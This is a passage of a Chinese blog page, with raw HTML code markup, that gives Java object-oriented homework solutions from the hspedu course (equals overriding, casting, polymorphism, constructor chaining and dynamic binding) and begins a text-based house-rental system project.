class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.homework.homework10;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Doctor</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String job;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">char</span> gender;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> sal;<br><br>  <span class="hljs-comment">//equals重写</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object obj)</span> &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span> == obj)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> Doctor)&#123;<br>            <span class="hljs-type">Doctor</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> (Doctor)obj;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name.equals(d.name)&amp;&amp;<span class="hljs-built_in">this</span>.age==d.age&amp;&amp;<span class="hljs-built_in">this</span>.job.equals(d.job)&amp;&amp;<span class="hljs-built_in">this</span>.gender==d.gender&amp;&amp;<span class="hljs-built_in">this</span>.sal==d.sal;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Doctor</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String job, <span class="hljs-type">char</span> gender, <span class="hljs-type">double</span> sal)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.job = job;<br>        <span class="hljs-built_in">this</span>.gender = gender;<br>        <span class="hljs-built_in">this</span>.sal = sal;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name =name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getJob</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> job;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setJob</span><span class="hljs-params">(String job)</span> &#123;<br>        <span class="hljs-built_in">this</span>.job = job;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">char</span> <span class="hljs-title function_">getGender</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> gender;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setGender</span><span class="hljs-params">(<span class="hljs-type">char</span> gender)</span> &#123;<br>        <span class="hljs-built_in">this</span>.gender = gender;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSal</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> sal;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSal</span><span class="hljs-params">(<span class="hljs-type">double</span> sal)</span> &#123;<br>        <span class="hljs-built_in">this</span>.sal = sal;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><blockquote><p>现有Person类，里面有方法run、eat，Student类继承了Person类，并重写了run方法，自定义了study方法，试写出对象向上转型和向下转型的代码，并写出各自都可以调用哪些方法，并写出方法输出什么？<br>class Person {<br>public void run() {System.out.println(“person run”); }<br>public void eat() {System.out.println(“person eat”); }</p><p>}</p><p>class Student extends Person {<br>public void run() {System.out.println(“student run”); }<br>public void study( {System.out.println(“student study..”);}</p><p>}</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">//向上转型</span><br> <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br> p.run(); <span class="hljs-comment">//student run 动态绑定</span><br> p.eat(); <span class="hljs-comment">//person eat</span><br> <span class="hljs-comment">//无法使用study（），因为编译类型是Person</span><br><br><span class="hljs-comment">//向下转型</span><br> <span class="hljs-type">Student</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> (Student) p;<br> s.run(); <span class="hljs-comment">//student run</span><br> s.eat(); <span class="hljs-comment">//person eat</span><br> s.study(); <span class="hljs-comment">//student study..</span><br></code></pre></td></tr></table></figure><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p>简答题：说出&#x3D;&#x3D;和equals的区别</p><table><thead><tr><th>名称</th><th>概念</th><th>用于基本数据类型</th><th>用于引用类型</th></tr></thead><tbody><tr><td>&#x3D;&#x3D;</td><td>比较运算符</td><td>可以，数值相等</td><td>可以，判断两个对象是否相等（是否为同一个对象）</td></tr><tr><td>equals</td><td>Object类的一个方法</td><td>不可以</td><td>可以。默认判断两个对象是否相等，但是子类往往重写该方法，比较对象的属性值是否相等。</td></tr></tbody></table><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><blockquote><p>打印效果：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220930135144242.png" alt="image-20220930135144242" style="zoom: 50%;" /><p>题目描述：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220930135228056.png" alt="image-20220930135228056"></p></blockquote><p>前1-6题及输出</p><p>Person：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">char</span> sex;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br><br>    <span class="hljs-comment">//玩的方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> name+<span class="hljs-string">&quot;爱玩&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">baseinfo</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;姓名:&quot;</span>+name+<span class="hljs-string">&quot;\n年龄：&quot;</span>+age+<span class="hljs-string">&quot;\n性别：&quot;</span>+sex;<br>    &#125;<span class="hljs-comment">//输出基本信息</span><br><br><span class="hljs-comment">//构造器、set、get</span><br><br></code></pre></td></tr></table></figure><p>Teacher</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> work_age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">(String name, <span class="hljs-type">char</span> sex, <span class="hljs-type">int</span> age, <span class="hljs-type">int</span> work_age)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name, sex, age);<br>        <span class="hljs-built_in">this</span>.work_age = work_age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getWork_age</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> work_age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWork_age</span><span class="hljs-params">(<span class="hljs-type">int</span> work_age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.work_age = work_age;<br>    &#125;<br>    <span class="hljs-comment">//教学的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;我承诺，我会认真教学。&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//重写玩的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.play()+<span class="hljs-string">&quot;象棋&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//输出信息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printinfo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;老师的信息：&quot;</span>);<br>        System.out.println(baseinfo());<br>        System.out.println(<span class="hljs-string">&quot;工龄：&quot;</span>+work_age);<br>        study();<br>       <br></code></pre></td></tr></table></figure><p>Student</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span>&#123;<br>    <span class="hljs-keyword">private</span> String stu_id;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">char</span> sex, <span class="hljs-type">int</span> age, String stu_id)</span>&#123;<br>        <span class="hljs-built_in">super</span>(name,sex,age);<br>        <span class="hljs-built_in">this</span>.stu_id=stu_id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStu_id</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> stu_id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStu_id</span><span class="hljs-params">(String stu_id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.stu_id = stu_id;<br>    &#125;<br><br>    <span class="hljs-comment">//学习的方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;我承诺，我会好好学习。&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//重写玩的方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.play()+<span class="hljs-string">&quot;足球&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//输出信息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printinfo</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;学生的信息：&quot;</span>);<br>        System.out.println(baseinfo());<br>        System.out.println(<span class="hljs-string">&quot;学号：&quot;</span>+stu_id);<br>        study();<br>        System.out.println(play());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Student</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;小明&quot;</span>,<span class="hljs-string">&#x27;男&#x27;</span>,<span class="hljs-number">15</span>,<span class="hljs-string">&quot;00023102&quot;</span>);<br><span class="hljs-type">Teacher</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;张飞&quot;</span>,<span class="hljs-string">&#x27;男&#x27;</span>,<span class="hljs-number">30</span>,<span class="hljs-number">5</span>);<br>t.printinfo();<br>System.out.println(<span class="hljs-string">&quot;----------------------&quot;</span>);<br>s.printinfo();<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220930145555766.png" alt="image-20220930145555766" style="zoom:50%;" /><p>7-8题</p><p>定义方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//定义方法，调用学生的study和老师的teach方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(Person p)</span>&#123;<br>    <span class="hljs-keyword">if</span> (p <span class="hljs-keyword">instanceof</span> Student)&#123;<br>        ((Student) p).study();<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (p <span class="hljs-keyword">instanceof</span> Teacher)&#123;<br>        ((Teacher) p).teach();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;do nothing...&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//age从高到低排序</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">(Person[] persons)</span>&#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt; persons.length;i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;persons.length-<span class="hljs-number">1</span>-i;j++)&#123;<br>            <span class="hljs-keyword">if</span> (persons[j].getAge()&gt;persons[j+<span class="hljs-number">1</span>].getAge())&#123;<br>                tmp = persons[j];<br>                persons[j] = persons[j+<span class="hljs-number">1</span>];<br>                persons[j+<span class="hljs-number">1</span>] = tmp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Main:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//定义多态数组</span><br>Person[] persons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[<span class="hljs-number">4</span>];<br>persons[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;小明&quot;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, <span class="hljs-number">15</span>, <span class="hljs-string">&quot;00023102&quot;</span>);<br>persons[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;小华&quot;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, <span class="hljs-number">17</span>, <span class="hljs-string">&quot;00023101&quot;</span>);<br>persons[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;张飞&quot;</span>, <span class="hljs-string">&#x27;男&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-number">25</span>);<br>persons[<span class="hljs-number">3</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;晓雪&quot;</span>, <span class="hljs-string">&#x27;女&#x27;</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>);<br><br><span class="hljs-type">Homework13</span> <span class="hljs-variable">homework13</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Homework13</span>();<br>homework13.bubbleSort(persons);<br><br><span class="hljs-comment">//输出排序后的数组</span><br>System.out.println(<span class="hljs-string">&quot;排序后：&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; persons.length; i++) &#123;<br>    System.out.println(persons[i]);<br>&#125;<br><span class="hljs-comment">//调用test方法</span><br>System.out.println(<span class="hljs-string">&quot;排序后：&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; persons.length; i++) &#123;<br>    homework13.test(persons[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220930151938440.png" alt="image-20220930151938440"></p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p>程序阅读题：</p><blockquote><p>程序阅读题在mian 方法中 执行:Cc ＝new C（）；输出什么内容？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>｛<br>  <span class="hljs-keyword">public</span> A（）｛<br>    System.out.println（＂我是A类＂）；<br>  ｝<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>｛<br>  <span class="hljs-keyword">public</span> B（）｛<br>    System.out.println（＂我是B类的无参构造＂）；<br>  <span class="hljs-keyword">public</span> B（String name）｛<br>    System.out.println（name＋＂我是B类的有参构造＂）；<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">C</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-built_in">this</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>      System.out.println（＂我是c类的无参构造＂）;<br>&#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-title function_">C</span><span class="hljs-params">(String name)</span>&#123;<br>      <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;hahah&quot;</span>);<br>      System.out.println（＂我是c类的有参参构造＂）; <br>&#125;<br>&#125;<br><span class="hljs-comment">//程序阅读题在mian 方法中 执行:Cc ＝new C（）；输出什么内容？</span><br></code></pre></td></tr></table></figure></blockquote><p>我是A类</p><p>hahah我是B类的有参构造</p><p>我是c类的有参参构造</p><p>我是c类的无参构造</p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p><strong>什么是多态，多态的具体表现形式？</strong></p><p>多态：方法或对象具有多种形态，是OOP的第三大特征，是建立在封装和继承之上。</p><p>多态的具体提现：</p><ol><li>方法多态<ol><li>重载</li><li>重写</li></ol></li><li>对象多态<ol><li>对象的编译类型和运行类型可以不一样，编译类型在定义时就确定了，不可改变。</li><li>对象的运行类型是可以变化的，可以通过getClass()来查看运行类型。</li><li>编译类型看定义时 &#x3D; 号的左边，运行类型看 &#x3D; 号的右边。</li></ol></li></ol><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><p><strong>java的动态绑定机制是什么？</strong></p><ol><li>当调用对象的方法时，该方法会和对象的内存地址&#x2F;运行类型绑定</li><li>当调用对象的属性时，没有动态绑定机制，哪里声明，哪里使用。</li></ol><h1 id="章节九"><a href="#章节九" class="headerlink" title="章节九"></a>章节九</h1><h2 id="房屋出租系统"><a href="#房屋出租系统" class="headerlink" title="房屋出租系统"></a>房屋出租系统</h2><p>做一个房屋出租系统。</p><blockquote><p>要求：</p><p>实现基于文本界面的《房屋出租软件》。<br>能够实现对房屋信息的添加、修改和删除（用数组实现），并能够打印房屋明细表。</p><p>界面：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001801903.png" alt="image-20221002001801903" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001821667.png" alt="image-20221002001821667" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001850708.png" alt="image-20221002001850708" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002001949774.png" alt="image-20221002001949774" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002002105678.png" alt="image-20221002002105678" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002002130978.png" alt="image-20221002002130978" style="zoom:50%;" /><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002002156950.png" alt="image-20221002002156950" style="zoom:50%;" /></blockquote><h2 id="1-项目框架图"><a href="#1-项目框架图" class="headerlink" title="1.项目框架图"></a>1.项目框架图</h2><p>项目设计-程序框架图（<strong>分层模式</strong>&#x3D;&gt;当软件设计比较复杂，需要模式管理）</p><p>1.系统有哪些类【文件】</p><p>2.明确类与类的调用关系</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002010200005.png" alt="image-20221002010200005"></p><p>根据结构图创建包和类。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20221002013409386.png" alt="image-20221002013409386" style="zoom:50%;" /><h2 id="2-每个区域实现的要点"><a href="#2-每个区域实现的要点" class="headerlink" title="2.每个区域实现的要点"></a>2.每个区域实现的要点</h2><h3 id="Utility类"><a href="#Utility类" class="headerlink" title="Utility类"></a>Utility类</h3><p>方法类。</p><p>韩老师代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span 